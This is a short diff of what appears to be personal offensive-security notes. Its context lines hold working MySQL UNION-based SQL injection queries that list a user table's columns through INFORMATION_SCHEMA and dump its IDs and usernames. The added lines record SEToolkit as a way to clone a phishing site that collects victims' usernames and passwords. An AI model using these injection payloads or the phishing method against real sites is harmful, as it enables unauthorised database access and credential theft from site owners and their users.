@@ -52,3 +52,10 @@ MYSQL INJECTION:
 		SELECT * FROM site_user WHERE user_name="test" UNION ALL SELECT 1,GROUP_CONCAT(column_name),3,4,5,6,7,8 FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='site_user'	
 	#to print all data from column
 		SELECT * FROM site_user WHERE user_name="test" UNION ALL SELECT 1,GROUP_CONCAT(id,user_name),3,4,5,6,7,8 FROM site_user
+
+
+#---------------------------------------------------------------------------------------------------------------------
+SEToolkit - to create exact phising site, and give us username password, while we live the phisiing site
+
+
+		
